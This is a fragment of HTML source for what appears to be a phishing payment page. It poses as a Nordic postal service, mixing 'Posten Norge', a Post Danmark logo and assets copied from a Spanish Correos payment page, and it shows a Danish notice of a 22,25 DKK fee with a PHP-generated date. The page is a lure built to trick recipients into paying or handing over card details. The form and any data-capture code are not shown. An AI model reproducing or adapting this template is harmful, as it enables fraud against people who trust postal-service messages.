...
<html xmlns="http://www.w3.org/1999/xhtml" class="wf-inactive"><head id="Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    ...
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><script language="javascript" type="text/javascript" src="./Seleccione medio de pago_files/typeKit.js"></script>
<meta http-equiv="refresh"
  ...
  width: 50%;
	...
	Posten Norge :online stores services
</title><link id="Link1" rel="shortcut icon" href="https://sc-icpdz.correos.es/ilionx45Front/lib/estilos/ilion/images/correos.ico"><link id="Link2" rel="icon" href="https://sc-icpdz.correos.es/ilionx45Front/lib/estilos/ilion/images/correos.ico" type="image/ico"><script language="javascript" type="text/javascript" src="./Seleccione medio de pago_files/jquery-1.7.1.js.download"></script>
                ...
                <div id="cabecera" class="container ogilvy-bg-amarillo">
                    <div class="row">
                        <div class="col-xs-12 text-center ogilvy-header">
                            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/f/fd/PostDKLogo.svg/300px-PostDKLogo.svg.png" id="logoCorreos" class="ogilvy-logosuperior">
                            <div id="languajes" class="ogilvy-languajes">
                                <a id="Ingles" class="ogilvy-english" href="javascript:__doPostBack(&#39;Ingles&#39;,&#39;&#39;)"></a>
                                <a id="Castellano" class="ogilvy-spanish" href="javascript:__doPostBack(&#39;Castellano&#39;,&#39;&#39;)"></a>
                            </div>
                        </div>
                        ...
                        <div class="row">
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                ...
                                <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                        <span id="fecha" class="descripcionPago" style="font-weight:bold;"> </span><span id="Fechavalor" style="font-weight:normal;"><?=date('d/m/Y').", ".date('g:i a');?></span>
                                    </div>
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;" class="ogilvy-titular">
                                        <span id="concepto" class="descripcionPago" style="font-weight:bold;"></span><span id="conceptovalor" style="font-weight:normal;">RETNING AF FORESPØRGSELEN TIL SIDEN FOR PROCESSORCENTRET ...</span>
                                    </div>
                                </div>
                                ...
                                <div id="divImportePago" class="ogilvy-importe text-right">
                                    ...
                                    <span id="importe">BELØB</span>
                                    <span id="lbCantidad" class="ogilvy-negrita">22,25 DKK</span>
	</div>
